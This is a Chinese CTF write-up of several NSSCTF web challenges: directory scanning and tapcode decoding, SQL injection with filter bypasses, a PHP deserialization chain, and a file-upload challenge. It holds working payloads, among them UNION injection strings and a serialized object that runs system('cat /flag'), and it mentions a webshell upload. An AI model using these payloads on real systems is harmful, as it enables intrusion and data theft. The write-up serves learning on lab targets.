<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u http://node5.anna.nssctf.cn:27571/</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_node5.anna.nssctf.cn_27571/__25-02-17_19-54-03.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span>node5.anna.nssctf.cn:<span class="number">27571</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">03</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span>                                   </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span>                                     </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">19</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">235</span>B  <span class="operator">-</span> <span class="symbol">/main.js</span>                                          </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>访问这个&#x2F;main.js </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">document.getElementsByTagName(&quot;button&quot;)[0].addEventListener(&quot;click&quot;, ()=&gt;&#123;</span><br><span class="line">    flag=&quot;33<span class="number"> 43 </span>43<span class="number"> 13 </span>44<span class="number"> 21 </span>54<span class="number"> 34 </span>45<span class="number"> 21 </span>24<span class="number"> 33 </span>14<span class="number"> 21 </span>31<span class="number"> 11 </span>22<span class="number"> 12 </span>54<span class="number"> 44 </span>11<span class="number"> 35 </span>13<span class="number"> 34 </span>14 15&quot;</span><br><span class="line">    if (btoa(flag.value) == &#x27;dGFwY29kZQ==&#x27;) &#123;</span><br><span class="line">        alert(&quot;you got hint!!!&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        alert(&quot;fuck off !!&quot;);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> dGFwY29kZQ== | <span class="built_in">base64</span> -d  </span><br><span class="line">tapcode  </span><br></pre></td></tr></table></figure></div>
<p>这个base64解码出来是<code>tapcode</code>，先去原界面输入了一下这个字符，还是不行，然后去搜索了一下 发现这是一种加密方式，flag就是用这种方式加密的</p>
<p><img src="https://pic1.imgdb.cn/item/67b3256cd0e0a243d40046d1.png"><br>让ai给我们解码了一下tapcode，得到</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">NSSCT FYOU <span class="built_in">FIND</span> FLAG BY TAPCODE</span><br></pre></td></tr></table></figure></div>
<p>或者先去掉空格，然后放到在线解码平台解码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# echo &quot;<span class="number">33 43 43 13</span> <span class="number">44 21 54 34</span> <span class="number">45 21 24 33</span> <span class="number">14 21 31 11</span> <span class="number">22 12 54 44</span> <span class="number">11 35 13 34</span> <span class="number">14</span> <span class="number">15</span>&quot; | tr -d &quot; &quot;</span><br><span class="line"><span class="number">3343431344215434452124331421311122125444113513341415</span></span><br></pre></td></tr></table></figure></div>
<p>最后的flag就是NSSCTF{youfindflagbytapcode} （先尝试原本的顺序，然后把空格去掉，最后考虑括号内变成小写</p>
<h1 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h1><p><img src="https://pic1.imgdb.cn/item/67b327afd0e0a243d400473b.png"><br>开始sql注入吧<br>先直接在url中用get传参，提示我记得刚刚说了的！！ 用相对安全的方式传参！！！<br>所以用post传<br>这题就是字符型注入，输入1’就报错了，然后注释符用<code>#</code>也就可以了<br>但是前面输入<code>nss=-1&#39; #</code>这样都可以然后输入or 1&#x3D;1 就报错了，说明or或者空格被过滤了，那空格就用&#x2F;**&#x2F;代替<br>or就用双写绕过，双写绕过就是利用or被替换成空，这样oorrder就会变成o rder，同理后面也发现union被过滤，也用这种方式<br>1.查列数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line">nss=<span class="number">-1&#x27;</span><span class="comment">/**/</span>oorrder<span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">3</span><span class="meta">#</span></span><br><span class="line"></span><br><span class="line">Flag: NSSCTF&#123;This_1s_F4ke_flag&#125;</span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: NSSCTF&#123;Ar3_y0u_K1ngd1ng&#125;</span><br><span class="line"></span><br><span class="line">nss=<span class="number">-1&#x27;</span><span class="comment">/**/</span>oorrder<span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">4</span><span class="meta">#</span></span><br><span class="line"></span><br><span class="line">Unknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>所以一共就是三列<br>2.爆库</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">n<span class="attr">ss</span><span class="operator">=</span><span class="operator">-</span><span class="number">1</span>&#x27;<span class="comment">/**/</span>uunionnion<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,database(),<span class="number">3</span><span class="comment">#</span></span><br><span class="line"><span class="params">Flag:</span> NSSCTF&#123;This_1s_F4ke_flag&#125;</span><br><span class="line"></span><br><span class="line">This is <span class="literal">true</span> <span class="params">flag:</span> NSSCTF&#123;Ar3_y0u_K1ngd1ng&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里没有直接给我们库名，所以猜测可能不在这页结果，这里要用到limit语句里限制查询结果数量</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="built_in">table_name</span> <span class="keyword">LIMIT</span> 偏移量, 数量;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">nss=-1&#x27;<span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>#</span><br><span class="line"></span><br><span class="line">Flag: NSS_db</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>3.爆表</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">nss=-1&#x27;<span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>();#</span><br><span class="line"></span><br><span class="line">Table &#x27;infmation_schema.tables&#x27; doesn&#x27;t exist</span><br><span class="line"></span><br><span class="line">#因为or被过滤了所以需要双写绕过</span><br><span class="line">nss=-1&#x27;<span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>infoorrmation_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()<span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>;#</span><br><span class="line"></span><br><span class="line">Flag: NSS_tb,users</span><br><span class="line"></span><br><span class="line">This is true flag: 3</span><br></pre></td></tr></table></figure>
<p>4.爆列</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line">nss=<span class="number">-1&#x27;</span><span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(column_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>infoorrmation_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name=<span class="string">&quot;NSS_tb&quot;</span><span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>;<span class="meta">#</span></span><br><span class="line">Flag: id,Secr3t,flll444g</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>5.查值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line">nss=<span class="number">-1&#x27;</span><span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(<span class="string">&quot;flll444g&quot;</span>),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>NSS_db.NSS_tb<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>;<span class="meta">#</span></span><br><span class="line">Flag: flll444g</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br><span class="line"></span><br><span class="line">nss=<span class="number">-1&#x27;</span><span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(Secr3t),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>NSS_db.NSS_tb<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span><span class="meta">#</span></span><br><span class="line">Flag: NSSCTF&#123;dd0e46f4<span class="number">-4</span>ce9<span class="number">-4533</span><span class="number">-97f</span>0-d01251ae184a&#125;</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h1 id="ez-1zpop"><a href="#ez-1zpop" class="headerlink" title="ez_1zpop"></a>ez_1zpop</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;weclome&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to NSS&#x27;</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>])) &#123;</span><br><span class="line">   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这题就是考php的反序列化链了，我们先要从结果出发，怎么样才能得到flag呢<br>之前做的反序列化题一般都是符合某种条件就输出flag，这里没有找到这样的文件，所以这个文件要我们通过某种方式获取<br>除了直接输出出来，那就是自己通过执行命令执行出来了。这里看着像能执行命令的只有这里<code> $b($this-&gt;title);</code><br>这不就是一个函数吗，<code>$b</code>是函数名<code>($this-&gt;title)</code>是参数，我们的目标就是用这个实现system函数。<br>然后这里也同时把fin这个类分析完了，那第一个dxg类发现没有任何用也不用再分析了<br>那就重点看这个lt类： 这里的__toString函数就是如果这两个md5一样但是本身一样就会执行$this-&gt;impo的fmm函数<br>那我们就让$this-&gt;impo是fin对象就可以了，这样才能达到我们执行函数的目的<br>最后是如何才能让这个__toString函数执行呢？只要这个被输出就可以了，这里__destruct函数有echo 可以！</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;240610708&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;QNKCDZO&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span> =  <span class="string">&quot;system&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nss</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lt</span>();</span><br><span class="line"><span class="variable">$nss</span> -&gt; impo = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nss</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:<span class="number">2</span>:<span class="string">&quot;lt&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;impo&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;url&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;title&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;&#125;s:<span class="number">4</span>:<span class="string">&quot;md51&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;240610708&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;md52&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;QNKCDZO&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>得到这个序列化的结果之后还要记得绕过wakeup函数，这个就是修改参数的个数就可以了 把”lt”后面的3改成别的数字<br><img src="https://pic1.imgdb.cn/item/67b33e67d0e0a243d4004d96.png"></p>
<h1 id="file-master"><a href="#file-master" class="headerlink" title="file_master"></a>file_master</h1><p><img src="https://pic1.imgdb.cn/item/67b33eb6d0e0a243d4004d9e.png"><br>又是一道文件上传题目<br>先上传一个正常的一句话木马的php上去，看看会怎么样<br><img src="https://pic1.imgdb.cn/item/67b33f28d0e0a243d4004daa.png"><br>只让上传jpg格式的文件，试试修改后缀为jpg，bp抓包然后修改后缀<br><img src="https://pic1.imgdb.cn/item/67b33fb4d0e0a243d4004dcd.png"><br>返回的是invalid file head，说明会检测文件头来看看是不是真的图片，那就在前面加上GIF89a<br>然后提示图片的宽高有限制，我就把&lt;?php 用&lt;?&#x3D; 方式简写，但是还是这个问题<br>卡住之后看了wp找到原来index.php可以看到源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$whtie_list</span> = <span class="keyword">array</span>(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$filetype</span>,<span class="variable">$whtie_list</span>))&#123;</span><br><span class="line">            <span class="variable">$img_info</span> = @<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$img_info</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$save_path</span> = <span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>().<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;upload success!! upload/your_sessionid/your_filename&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;image hight and width must less than 20&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;invalid file head&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;invalid file type!image/jpeg only!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;welcome.jpg&quot;</span>)).<span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span 